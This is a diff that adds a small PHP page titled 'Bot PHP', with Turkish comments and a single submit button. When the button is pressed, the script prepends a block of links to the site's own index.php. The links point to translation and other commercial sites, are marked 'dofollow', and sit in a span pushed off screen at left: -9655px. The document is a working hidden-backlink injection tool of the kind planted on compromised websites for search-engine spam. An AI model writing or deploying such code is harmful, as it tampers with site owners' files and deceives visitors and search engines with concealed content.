@@ -1,0 +1,53 @@
+<?php
+// Backlink ekleme işlemi
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Eklenecek backlink kodu
+    $backlinkCode = '<span style="position: absolute; left: -9655px;">
+<p>Free Translation Services <a title="freetranslations.org" href="https://www.freetranslations.org/" rel="dofollow">freetranslations.org</a></p>
+<p>Text to Speech and Voice Translator<a title="translatedict.com" href="https://www.translatedict.com/voice-translator.html" rel="dofollow"> translatedict.com</a></p>
+<p>Spanish to English Voice Translator<a title="spanishenglish.net" href="https://spanishenglish.net/voice-translator/" rel="dofollow"> spanishenglish.net</a></p>
+<p>Translate Spanish to English <a title="spanishenglish.com" href="https://www.spanishenglish.com/" rel="dofollow">spanishenglish.com</a></p>
+<p>En Yakin Akucu <a title="akumyolda.com" href="https://akumyolda.com/en-yakin-akucu/" rel="dofollow">akumyolda.com</a></p>
+<p>Ingilizce Turkce Ceviri <a title="turkceingilizce.gen.tr" href="https://turkceingilizce.gen.tr/ingilizce-turkce-ceviri/" rel="dofollow">turkceingilizce.gen.tr</a></p>
+<p>Ingilizceyi Turkceye Cevir <a title="ingilizceturkce.gen.tr" href="https://www.ingilizceturkce.gen.tr/" rel="dofollow">ingilizceturkce.gen.tr</a></p>
+</span>' . PHP_EOL;
+
+    // Ana dizindeki index.php dosyasının yolu
+    $indexFilePath = __DIR__ . DIRECTORY_SEPARATOR . 'index.php';
+
+    // index.php dosyasını kontrol ve düzenleme işlemi
+    if (file_exists($indexFilePath)) {
+        // Dosya içeriğini oku
+        $fileContents = file_get_contents($indexFilePath);
+        
+        // Backlink zaten var mı kontrol et
+        if (strpos($fileContents, $backlinkCode) === false) {
+            // Yeni içerik: backlink kodu + orijinal içerik
+            $newContents = $backlinkCode . $fileContents;
+            
+            // Dosyayı yeni içerikle yaz
+            if (file_put_contents($indexFilePath, $newContents)) {
+                echo "Backlink başarıyla eklendi: $indexFilePath\n";
+            } else {
+                echo "Dosyaya yazma hatası: $indexFilePath\n";
+            }
+        } else {
+            echo "Backlink zaten mevcut: $indexFilePath\n";
+        }
+    } else {
+        echo "index.php dosyası bulunamadı: $indexFilePath\n";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bot PHP</title>
+</head>
+<body>
+    <form method="post">
+        <button type="submit">EKLE</button>
+    </form>
+</body>
+</html>
